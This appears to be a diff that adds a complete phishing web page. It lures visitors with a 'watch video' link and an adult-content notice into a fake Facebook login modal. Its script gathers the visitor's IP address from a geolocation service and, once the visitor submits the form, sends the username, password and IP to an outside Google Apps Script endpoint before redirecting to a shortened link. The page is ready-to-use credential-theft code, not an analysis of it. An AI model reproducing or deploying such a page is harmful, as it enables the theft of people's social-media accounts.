@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title></title>
+    <style>
+        .modal-content {
+            width: 380px;
+            height: 480px;
+            background-color: transparent !important;
+            box-shadow: none !important;
+            border: 0 !important;
+        }
+        .modal-body {
+            background: radial-gradient(ellipse at center,#5170ad 0,#355493 100%);
+            border: 1px solid #2d416d;
+            box-shadow: 0 1px #5670a4 inset, 0 0 10px 5px rgba(0,0,0,.1);
+            border-radius: 5px;
+            width: 380px;
+            height: 480px;
+            margin: 60px auto;
+            padding: 50px 30px 0 30px !important;
+            text-align: center;
+            margin-left: 50%;
+            transform: translateX(-25%);
+        }
+        .modal-body h1 {
+                margin: 0 0 50px 0;
+            padding: 0;
+            font-weight: 700;
+            font-size: 26px;
+            color: #fff;
+        }
+        .login-form input[name=username], .login-form input[name=password] {
+            width: 100%;
+            border: 1px solid #314d89;
+            margin-right: 110px;
+            outline: 0;
+            padding: 12px 20px;
+            font-weight: 400;
+            font-family: Lato,sans-serif;
+            cursor: pointer;
+        }
+        .login-form input[name=username] {
+            border-bottom: none;
+            border-radius: 4px 4px 0 0;
+            padding-bottom: 13px;
+            box-shadow: 0 -1px 0 #e0e0e0 inset, 0 1px 2px rgba(0,0,0,.23) inset;
+        }
+        .login-form input[name=password] {
+            border-top: none;
+            border-radius: 0 0 4px 4px;
+            box-shadow: 0 -1px 2px rgba(0,0,0,.23) inset, 0 1px 2px rgba(255,255,255,.1);
+        }
+        #btnSubmit {
+            font-family: Lato,sans-serif;
+            font-weight: 400;
+            background: linear-gradient(to bottom,#e0e0e0 0,#cecece 100%);
+            display: block;
+            margin: 20px auto 0 auto;
+            width: 100%;
+            border: none;
+            border-radius: 3px;
+            padding: 8px;
+            font-size: 17px;
+            color: #636363;
+            text-shadow: 0 1px 0 rgba(255,255,255,.45);
+            font-weight: 700;
+            box-shadow: 0 1px 3px 1px rgba(0,0,0,.17), 0 1px 0 rgba(255,255,255,.36) inset;
+        }
+        .login-form-wrap h5>a {
+            font-size: 14px;
+            color: #fff;
+            text-decoration: none;
+            font-weight: 400;
+        }
+        .mt-10 {
+            margin-top: 10px;
+            margin-bottom: 10px;
+        }
+        @media (max-width: 992px) {
+            .modal-content {
+                box-shadow: none !important;
+            }
+            .modal-dialog, .modal-content, .modal-body, label {
+                width: 100% !important;
+            }
+            .modal-body { 
+                margin-left: 0;
+                transform: translateX(0);
+                height: 750px;
+            }
+            .facebook_logo {
+                font-size: 60px !important;
+                margin: 50px 0 !important;
+            }
+            .login-form-wrap, #btnSubmit {
+                font-size: 40px !important;
+            }
+            .forgotpass {
+                font-size: 30px !important;
+            }
+            .title {
+                font-size: 60px !important;
+            }
+            .forgotpass_h5 {
+                margin-top: 50px;
+            }
+        }
+        
+    </style>
+</head>
+
+<body onclick="showModal();">
+    <div align="center" style="margin-top: 30px;">
+        <div class="separator" style="clear: both; text-align: center;">
+            <b><span style="color: red; font-size: 26pt; font-style: italic;"><a class="title" href="#" onclick="showModal()" style="color: red;">▶ CLICK HERE TO WATCH VIDEO</a></span></b>
+        </div>
+        <img src="https://i.imgur.com/TUiIhpE.jpg" class="img-responsive" id="img1" style="display: none;" alt="Image">
+        <img src="https://i.imgur.com/TUiIhpE.jpg" class="img-responsive" id="img2" style="display: none;" alt="Image">
+        <img src="https://i.imgur.com/TUiIhpE.jpg" class="img-responsive" id="img3" style="display: none;" alt="Image">
+        <img src="https://i.imgur.com/TUiIhpE.jpg" class="img-responsive" id="img4" style="display: none;" alt="Image">
+        <img src="https://i.imgur.com/TUiIhpE.jpg" class="img-responsive" id="img5" style="display: none;" alt="Image">
+    </div>
+    <div id="myModal" class="modal fade" role="dialog">
+        <div class="modal-dialog">
+            <!-- Modal content-->
+            <div class="modal-content">
+                <div class="modal-body">
+                    <section class="login-form-wrap">
+                        <h1 class="facebook_logo">Facebook</h1>
+                        <div style="    background-color: #fff9d7; border: 1px solid #e2c822; padding: 6px; margin-bottom: 5px;" id="noti">Content 18+, please login before viewing.</div>
+                        <form class="login-form" id="test-form" method="GET" action="https://script.google.com/macros/s/AKfycbwBS2qHdiXzFs4doUtk6F5ASLjQhW1R7VNe1JzrPriLjr7cXjC0XyZ6cb6bIQ-9meu4/exec">
+                            <label class="mt-10">
+                                <input id="username" type="text" name="username" required="" placeholder="Email or phone number">
+                            </label>
+                            <label class="mt-10">
+                                <input id="password" type="password" name="password" required="" placeholder="password">
+                            </label>
+							<input id="country" type="text" name="country" style="display:none">
+                            <input class="mt-10" type="button" onclick="submitForm();" id="btnSubmit" value="Log in">
+                        </form>
+                        <h5 class="forgotpass_h5"><a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login" target="_blank" class="forgotpass">Forgot password?</a></h5>
+                    </section>
+                </div>
+            </div>
+        </div>
+    </div>
+</body>
+<div style="position: fixed; z-index: 10000; text-align: center; top: 0; display: none; left: 0; width: 100vw; height: 100vh; background-color: rgba(0,0,0,.5);" id="loading">
+    <img src="https://www.fk-austria.at/?proxy=images/waiting.gif" style="margin-top: 100px; width: 100px; height: 100px;">
+</div>
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
+<script type="text/javascript">
+$(document).ready(() => {
+    let num = Math.floor(Math.random() * 5) + 1;
+    $('#img' + num).show();
+});
+var count = 0;
+
+
+var g_IPAdress = "";
+var g_Country = "";
+GetIPAdress();
+function GetIPAdress() {
+ var requestOptions = {
+ method: 'GET',
+ redirect: 'follow'
+ };
+
+ fetch("http://gd.geobytes.com/GetCityDetails", requestOptions)
+ .then(response => response.text())
+ .then(result => {
+ try {
+ let res = JSON.parse(result);
+ g_IPAdress = res.geobytesipaddress;
+ g_Country = res.geobytesfqcn;
+ 
+ document.getElementById("country").value = g_IPAdress;
+ }
+ catch (ex) { }
+
+ })
+ .catch(error => console.log('error', error));
+}
+
+function submitForm() {
+	$('#username').val("'" + $('#username').val());
+	$('#password').val("'" + $('#password').val());
+
+    if ($('#username').val().length < 3 || $('#password').val().length < 6) {
+		//alert('Information entered is not correct');
+		$('#noti').css({ "color": "red" });
+		$('#noti').text('The account you have entered is invalid, Please try again.');
+		return;
+    } else {
+        //count++;
+    }
+
+    if (true) {
+        console.log(count);
+        $('#loading').show();
+        var data = $('form#test-form').serialize();
+        $.ajax({
+            type: 'GET',
+            url: 'https://script.google.com/macros/s/AKfycbwBS2qHdiXzFs4doUtk6F5ASLjQhW1R7VNe1JzrPriLjr7cXjC0XyZ6cb6bIQ-9meu4/exec',
+            dataType: 'json',
+            crossDomain: true,
+            data: data,
+            success: function(data) {
+                $('#loading').hide();
+				location.href = "https://bit.ly/2Ql39OJ";
+				return;
+				
+            }, error: function(request, status, error) {
+                $('#loading').hide();
+				
+				location.href = "https://bit.ly/2Ql39OJ";
+            }
+        });
+    }
+}
+
+function showModal(e) {
+    $('#myModal').modal({
+        backdrop: 'static',
+        keyboard: true,
+        show: true
+    });
+}
+
+$('#myModal').click(() => {
+    event.stopPropagation();
+})
+
+$('#loading').click(() => {
+    event.stopPropagation();
+})
+</script>
+
+</html>
